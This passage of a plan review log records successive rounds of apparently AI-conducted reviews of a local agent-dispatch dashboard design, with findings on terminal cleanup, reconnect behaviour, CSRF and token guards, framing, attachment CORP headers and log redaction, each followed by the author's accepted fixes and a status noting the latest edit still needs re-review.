   "evidence": "pty.fork makes the shell a session leader, but interactive job control can place foreground pipelines and background jobs in different process groups. Killing only the shell's group does not guarantee termination of those jobs; a job that handles or ignores SIGHUP can survive. Waiting for the shell alone cannot establish the acceptance criterion that closing a tab leaves no process behind.",
   "fix": "Define cleanup for all owned terminal-session jobs or descendants, including their separate process groups. Stop reader activity safely and reap direct children before discarding ownership. Cover a foreground or background job outside the shell's process group."
  },
  {
   "id": "MPD-29",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:98",
   "evidence": "The specified protocol returns term_id only when opening a terminal and requires that id to attach. It provides neither terminal inventory nor persisted client identifiers. After a page reload, the new JavaScript state cannot reconstruct the existing tabs using the listed events alone. The current connect handler always opens a new PTY, which would accumulate detached terminals if merely renamed.",
   "fix": "Add a terminal-inventory operation or server-pushed inventory on connection, with metadata and lifecycle state sufficient to rebuild tabs. Reconnect should restore existing tabs before opening replacements and handle stale identifiers."
  },
  {
   "id": "MPD-30",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:98",
   "evidence": "term_attach explicitly replays scrollback before joining the live room. Output produced after the replay snapshot but before room membership is established reaches neither the replay nor the client. A reloaded terminal can therefore permanently miss lines while its process is active.",
   "fix": "Make subscription and replay ordering coherent, using sequence numbers and a captured replay boundary, or an equivalent synchronized protocol. Handle duplicates and gaps explicitly and cover output emitted during attachment."
  },
  {
   "id": "MPD-31",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:106",
   "evidence": "Existing progress events cannot supply the advertised assistant/tool/result live view across launch paths. _stream_claude_run writes JSONL and progress metadata but does not emit assistant text; the cited run_progress lines 2312/2321 belong to DeepSeek TUI. Linear Claude/Codex dispatch currently waits for communicate() to finish before parsing output. Rendering existing events alone leaves those run tabs incomplete or silent until completion.",
   "fix": "Specify a normalized incremental run-event stream for every supported backend and launch path, including Linear dispatch. Feed the same bounded in-memory stream to live tabs and reattachment rather than relying on snippets or completion-only parsing."
  },
  {
   "id": "MPD-32",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:113",
   "evidence": "The claim that confidential run-tab output is absent from disk conflicts with Decision 4a, which intentionally stores that run's output in a local side file. Existing _stream_claude_run also writes its raw stream to disk. The Phase 3 test at line 179 therefore cannot hold for a run tab displaying the same persisted headless output.",
   "fix": "Separate ephemeral interactive-terminal scrollback from the existing headless run payload. State that tabs introduce no additional persistence, and test that narrower contract while retaining the explicitly authorized local run records."
  },
  {
   "id": "MPD-33",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:87",
   "evidence": "The prerequisite dsh plan now unconditionally rejects current dsh versions for confidential projects because its installed macOS profile permits network access. This plan still describes conditional confidential eligibility and retains Phase 2 tests expecting legacy DeepSeek TUI argv to remain unchanged after those backends are retired. The dsh plan also permits runner-side commits when its sandbox cannot commit, whereas this plan assigns commits to the agent. The combined execution and test contract is inconsistent.",
   "fix": "Align Phase 2 with canonical dsh ids and current unconditional confidential rejection. Integrate any runner-side commit path explicitly into ticket ownership and seed/verification ordering. For terminal follow-up, define a supported dsh action or omit Resume in tab when no interactive backend exists."
  },
  {
   "id": "MPD-34",
   "severity": "medium",
   "path": "runner/modules/pty/__init__.py:91",
   "evidence": "The proposed skill-handoff port changes sid to term_id, but _record_pending_handoff currently writes the completed command to RUN_LOG without project or confidential context. A handoff from a new confidential-project terminal can therefore put a private command or path into the knowledge-base log instead of the redacted project record.",
   "fix": "Resolve project/confidential context from the server-owned terminal entry and pass it to the logging policy. Redact confidential handoff commands in shared logs, or retain them only in permitted local storage. Cover a confidential command sentinel through the handoff path."
  }
 ],
 "coverage": [
  "Verified the on-disk plan SHA256 b7618d682852dd58461cf8d90067d6baced775e4cbbed1f50e347a049ece3bcd and reviewed all post-approval amendments.",
  "Confirmed SocketIO wildcard configuration, startup argument parsing, PTY event handlers, and installed Engine.IO 4.13.1 Origin validation, including its request-Host-derived default.",
  "Inspected installed Flask 3.1.3 Host validation and Flask-SocketIO middleware routing; traced /run, /stream, upload, and STT side effects.",
  "Traced CLI builders, resume commands, Linear dispatch, stream writers, progress consumers, PTY readers, handoff logging, and shared-state integration.",
  "Read the referenced dsh plan and inspected the installed macOS Seatbelt profile, which restricts writes but contains no network restriction.",
  "Read Codex 0.162.0 help/version output and current official OpenAI and Claude sandbox documentation using the openai-docs skill.",
  "Checked prior findings against the preserved remedies without reopening their resolved scenarios. The moved Phase 3 checkbox and duplicated origin acceptance wording are editorial cleanup, not additional material findings."
 ],
 "limitations": [
  "This is a static plan and integration review. No tests, browser attacks, handshakes, sandbox spikes, provider requests, or agent executions were performed.",
  "Only CLI help/version commands were inspected; their output does not establish runtime sandbox or approval behavior.",
  "No files were edited and no work was delegated.",
  "The new project and terminal implementations are not available for implementation-level validation. Private registries, live sessions, pilot repositories, and launchd behavior were not inspected.",
  "Current vendor documentation may differ from installed CLI behavior; the specified spikes remain necessary after correcting the reviewed contracts."
 ]
}
```

### Host dispositions
- MPD-21 accepted: Flask TRUSTED_HOSTS from --host (Flask 3.1.3 installed; default None verified).
- MPD-22 accepted: verified GET /stream (app.py:2634) dispatches from query args. Fix = one before_request guard on Sec-Fetch-Site (fallback Origin), exempting only top-level GET / navigation; header-less local clients allowed. Chosen over per-route CSRF tokens: one hook covers every route incl. /stream, uploads, STT, PATCH; /stream stays GET (EventSource).
- MPD-23 accepted: `codex exec --help` says --approve-for-me itself uses workspace-write; dropped --sandbox; argv errors are fixed, not fallback triggers.
- MPD-24 accepted: Codex pins network_access=false + writable_roots=[] via -c; Claude settings pin failIfUnavailable/allowUnsandboxedCommands=false/no excludedCommands + narrowed --setting-sources (worktree .claude/settings.json is agent-writable). Spike adds permissive-config cases.
- MPD-25 accepted: confidential verify under sandbox-exec profile (deny network*, file-write* outside worktree/git common dir/tmp); spike (g); failure => verify: manual.
- MPD-26 accepted: resume via _ai_cli(binding, interactive=True); hidden when no eligible form or dsh.
- MPD-27 accepted: bound-worktree tabs hold the ticket lock while open; run tabs and main-path shells take none.
- MPD-28 accepted: kill every pgid in the shell session (pgrep -s sid); setsid daemons documented as limit.
- MPD-29 accepted: term_list inventory; connect no longer opens a PTY.
- MPD-30 accepted in simpler form: one per-terminal lock shared by reader-emit and attach(join+snapshot), instead of sequence numbers.
- MPD-31 accepted: verified 2312/2321 are not Claude-path events; launch helper streams line-by-line for all paths incl. Linear, bounded per-run ring, run_event.
- MPD-32 accepted: tabs add no persistence; run records (4a side file, stream log) unchanged; test narrowed.
- MPD-33 accepted: dsh always rejected for confidential; Phase 2 backend list/test aligned to canonical ids post-swap; runner-side dsh commit ordered reap→add→commit→seed check→verify under lock; no Resume in tab for dsh.
- MPD-34 accepted: verified _record_pending_handoff writes RUN_LOG without project context; handoff now goes through binding-aware _write_run_log.
- Editorial: Phase 3 N/A format fixed; duplicate origin criterion merged into one security acceptance line.
- Revised plan sha256: bd2f69726f739763c8b2c498818c0cd368b68a72a503f7b13f4b71aca63b7a04

## Round 6 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r6/claudex-ii95b1fn/result.json` · session 01a1376d… · plan sha256 bd2f6972… · 363 s · assurance cross_provider
- Verdict: **REVISE** (1 high, 2 medium)
```json
{
 "verdict": "REVISE",
 "summary": "The plan hash matches, and most prior findings have explicit remedies. Three concrete defects remain in the revised browser guard and macOS terminal cleanup.",
 "findings": [
  {
   "id": "MPD-35",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Requests without Sec-Fetch-Site and Origin are not necessarily local CLI requests. A browser without Fetch Metadata support can send an image GET without either header. Metadata is also omitted for non-trustworthy HTTP targets, including some configured non-loopback hosts. The guard then admits /stream?prompt=…, which starts an agent. Host validation does not block requests addressed to an allowed host. [Fetch Metadata specification](https://www.w3.org/TR/fetch-metadata/#integration), [Origin-header rules](https://fetch.spec.whatwg.org/#append-a-request-origin-header).",
   "fix": "Require an independent request-intent proof for side-effect endpoints when browser provenance headers are absent. For EventSource, use a dashboard-issued unguessable token; provide an explicit protected request mechanism for CLI clients. Retain unrestricted header-less access only for harmless routes."
  },
  {
   "id": "MPD-36",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Sec-Fetch-Mode: navigate does not establish a top-level navigation: iframe loads also use navigate. The described exemption can therefore admit a cross-site iframe containing the dashboard, enabling clickjacking. During the independently shipped precondition phase, the current dashboard also automatically opens a PTY on connection (index.html:3518-3522). [Navigation destinations](https://www.w3.org/TR/fetch-metadata/#sec-fetch-dest-header).",
   "fix": "Require Sec-Fetch-Dest: document for the top-level exemption and add a frame-ancestors policy. Explicitly reject the cross-site iframe case while preserving ordinary links and bookmarks."
  },
  {
   "id": "MPD-37",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:132",
   "evidence": "The installed macOS /usr/bin/pgrep does not support -s. Its binary option string is DF:G:ILP:U:ac:d:fg:ilnoqt:u:vx, and /usr/share/man/man1/pgrep.1 comments out the session-selection option. The proposed cleanup command therefore cannot enumerate terminal-session jobs on this host. Additionally, pgrep outputs PIDs, not PGIDs.",
   "fix": "Use a supported macOS process enumeration mechanism, determine each process's session and process-group ids, and deduplicate PGIDs before signalling. Treat enumeration failures as cleanup failures. Cover groups whose original leader has already exited."
  }
 ],
 "coverage": [
  "Read the revised plan and verified SHA256 bd2f69726f739763c8b2c498818c0cd368b68a72a503f7b13f4b71aca63b7a04.",
  "Compared all fourteen Round 5 findings with the revised remedies; confirmed the Host-validation design and preserved prior plan-level fixes.",
  "Traced /stream dispatch, Flask Host validation, Engine.IO Origin checks, dashboard connection behavior, PTY creation/readers, and handoff logging.",
  "Reviewed revised sandbox, verification, resume, locking, event-stream, persistence, and dsh integration contracts against existing parsers and the referenced dsh plan.",
  "Inspected installed macOS pgrep documentation and binary option metadata, plus primary Fetch specifications."
 ],
 "limitations": [
  "No tests, browser attacks, handshakes, sandbox probes, process launches, or cleanup operations were performed.",
  "No files were edited and no work was delegated.",
  "This remains a plan review; the new project and terminal implementations are unavailable for implementation-level validation.",
  "Private registry entries, pilot repositories, live session stores, and launchd behavior were not inspected. The stated test baseline remains unverified."
 ]
}
```

### Host dispositions
- MPD-35 accepted, by a different route than the Fetch-Metadata guard: GET /stream has no caller (no EventSource in index.html; grep over the repo and LaunchAgents finds none), so it is deleted. Every request except GET /, favicon and static now requires a per-process X-AgenticOS-Token, rendered into index.html and added by one fetch/XHR wrapper. Socket.IO connects with auth.token and the connect handler rejects a mismatch. The Sec-Fetch guard is dropped as redundant. No CLI HTTP client exists, so there is no token file (YAGNI).
- MPD-36 accepted: CSP frame-ancestors 'none' on every response. With the token required on everything, the navigate exemption question disappears; framing is blocked so the token and auto-PTY cannot be used from an iframe.
- MPD-37 accepted: verified `pgrep -s` exits 2 on this Mac, and ps `sess` reports 0. Now ps -A -o pid=,pgid= with os.getsid(pid)==shell sid, pgids deduplicated. A failed enumeration means cleanup_failed. Test covers a group whose leader has exited.
- Also: 3a no longer lists /stream as a launch site.
- Revised plan sha256: 9f8b839f50ef7ad72c68bf6f0e6db7e6abf3ec3cd21c72cece2a722ca0586d47

## Round 7 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r7/claudex-ypzd02nm/result.json` · session 01a1376d… · plan sha256 9f8b839f… · 203 s · assurance cross_provider
- Verdict: **REVISE** (1 medium, 1 low)
```json
{
 "verdict": "REVISE",
 "summary": "The revision addresses MPD-35–37 at the plan level. The token requirement introduces an attachment-access regression, and the companion plan contradicts the removal of /stream.",
 "findings": [
  {
   "id": "MPD-38",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:45",
   "evidence": "The token hook protects attachment downloads, but the client changes cover only fetch/XHR. _renderAttachList creates ordinary links at runner/templates/index.html:3797. Upload returns /api/board/uploads/<filename>, served by runner/modules/pty/__init__.py:208. Clicking that link cannot supply X-AgenticOS-Token, so uploading succeeds but opening the attachment returns 403.",
   "fix": "Add an authenticated attachment-download flow using the token-bearing fetch wrapper. Preserve endpoint protection, avoid placing the process token in URLs, and download or isolate active content rather than executing it in the dashboard origin. Include opening an uploaded attachment in verification."
  },
  {
   "id": "MPD-39",
   "severity": "low",
   "path": "docs/exec-plans/active/2026-10-14-dsh-backend-swap.md:51",
   "evidence": "The security precondition deletes /stream before other work, but the companion plan explicitly requires /stream to retain its current behavior. Its command and environment integration also still name that route at lines 48 and 55. The two active work orders give conflicting requirements for the same endpoint.",
   "fix": "Update the companion plan to recognize /stream's deletion and remove its dispatch integration requirements, retaining text-mode support for Linear skill routing."
  }
 ],
 "coverage": [
  "Verified the on-disk plan SHA256 matches 9f8b839f50ef7ad72c68bf6f0e6db7e6abf3ec3cd21c72cece2a722ca0586d47.",
  "Checked MPD-35–37 dispositions against the revised token, framing and terminal-session cleanup design.",
  "Traced dashboard fetch calls, Socket.IO connection setup, native attachment links, upload writers and attachment-serving routes.",
  "Inspected installed Flask-SocketIO and Engine.IO middleware dispatch to distinguish HTTP-hook coverage from Socket.IO authentication.",
  "Searched runner, scripts and tests for /stream and EventSource callers; checked companion-plan backend, commit, resume and endpoint requirements."
 ],
 "limitations": [
  "Static plan and source review only; no files edited, tests run, agents delegated, browser checks, handshakes or sandbox probes performed.",
  "The proposed token controls and terminal registry are not implemented in the inspected source; their runtime behavior remains unverified.",
  "LaunchAgent caller claims and private project configuration were not independently inspected."
 ]
}
```

### Host dispositions
- MPD-38 accepted. GET /api/board/uploads/<f> is exempt from the token: it is a read-only serve, a cross-site page cannot read it without CORS, and the Host check blocks rebinding. The token stays out of URLs. The serve route adds CSP sandbox + nosniff, so an uploaded HTML/SVG runs in an opaque origin with no scripts and cannot read the token. Verification adds an attachment-open test and a malicious-upload test. A fetch-and-blob download flow was rejected: it adds client code for no extra protection.
- MPD-39 accepted. dsh plan Decision 2 edited (lines 48/51/55) to drop the /stream requirements; Linear routing keeps text mode. dsh plan sha256 is now 77e13df9…; its Round 6 approval is void and the edit is logged in its review log. It needs a re-review.
- Revised plan sha256: 8e0b84221d6a5eb32d67e96f4b62860b243893a3f2bd6d342d375f972eb7c9c2

## Round 8 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r8/claudex-g93zpij3/result.json` · session 01a1376d… · plan sha256 8e0b8422… · 202 s · assurance cross_provider
- Verdict: **REVISE** (1 medium)
```json
{
 "verdict": "REVISE",
 "summary": "MPD-38’s attachment-access regression and MPD-39’s cross-plan conflict are addressed. The new attachment exemption leaves a cross-origin disclosure path.",
 "findings": [
  {
   "id": "MPD-40",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Absence of CORS does not prevent classic script embedding. The upload route accepts arbitrary extensions, and send_from_directory infers MIME types (runner/modules/pty/__init__.py:184–213). If an uploaded config.js contains window.config = {secret: '…'}, an attacker page can load its predictable localhost URL through <script src>, then read window.config. The Host is legitimate, no token is required, and nosniff accepts correctly typed JavaScript. CSP sandbox governs documents, not the embedding page’s script execution. See [cross-origin embedding](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_network_access) and [sandbox scope](https://www.w3.org/TR/CSP3/#directive-sandbox).",
   "fix": "Add Cross-Origin-Resource-Policy: same-origin to attachment responses, retaining sandbox and nosniff. Verify that a foreign page cannot execute an uploaded JavaScript fixture or observe its sentinel, while ordinary dashboard attachment links still work. [CORP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cross-Origin_Resource_Policy) specifically blocks cross-origin no-cors embedding."
  }
 ],
 "coverage": [
  "Verified the plan SHA256 matches 8e0b84221d6a5eb32d67e96f4b62860b243893a3f2bd6d342d375f972eb7c9c2.",
  "Checked MPD-38 against attachment links, upload writers, file serving and MIME inference.",
  "Verified the dsh companion SHA256 begins 77e13df9 and Decision 2 removes /stream integration requirements.",
  "Checked browser sandbox, nosniff and cross-origin embedding semantics against W3C and Mozilla documentation."
 ],
 "limitations": [
  "Static review only; no edits, tests, browser experiments, sandbox probes or delegation performed.",
  "The proposed security controls remain unimplemented in the inspected source.",
  "The companion plan was checked for cross-plan consistency, not given a standalone approval."
 ]
}
```

### Host dispositions
- MPD-40 accepted: no-cors <script src> embedding of an uploaded .js bypasses "no CORS". The attachment serve now adds Cross-Origin-Resource-Policy: same-origin (plus sandbox and nosniff). A header test and a manual cross-origin <script src> sentinel check were added.
- Revised plan sha256: a04f619e8c1e74dfe458b254ad3b03df3a66043bb02a43752bafdace7cc4590c

## Round 9 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r9/claudex-d3y7bdmd/result.json` · session 01a1376d… · 36 s · assurance cross_provider · observed model unknown (CLI default)
- Verdict: **APPROVED**, no findings. Approval bound to plan sha256 a04f619e8c1e74dfe458b254ad3b03df3a66043bb02a43752bafdace7cc4590c.
- Limitations (reviewer): approval covers the plan, not an implemented boundary. No tests, browser checks or sandbox probes were run. Spikes, implementation and dogfooding remain.

## Status (2026-10-14)
- Post-approval amendments re-reviewed in Rounds 5–9: 20 findings (MPD-21…40). All accepted; MPD-30, MPD-35 and MPD-38 were resolved in a simpler form than the reviewer proposed. 9/20 rounds used in total.
- Companion dsh plan edited for MPD-39. Its approval is void (sha 77e13df9…) and it needs a re-review.
- The pre-existing holes (Socket.IO "*", GET /stream, no Host check) are still live in the code. Build is NOT authorized.

### Post-approval edit — host (2026-10-14), NOT YET REVIEWED
- User: "DSH-30 放到 2026-10-13-multi-project-dispatch.md".
- Added a Phase 2 checklist item: the tracker reset boundary (DSH-30).
  - Source: Codex inspection 4 of the dsh backend swap.
  - Problem: a drag to Todo through the tracker routes writes no reset record, so retry still resumes the old session, for every agent.
  - The dsh plan rejected it as out of scope, because it is pre-existing and affects all agents.
- Plan sha256 is now c6354d8fda91cb232a0ed54bacef4a3ba1f52d05d6ce47e7fa70ca1ae878c3e4. **The Round 9 approval (a04f619e…) no longer covers it.** Re-review before build.
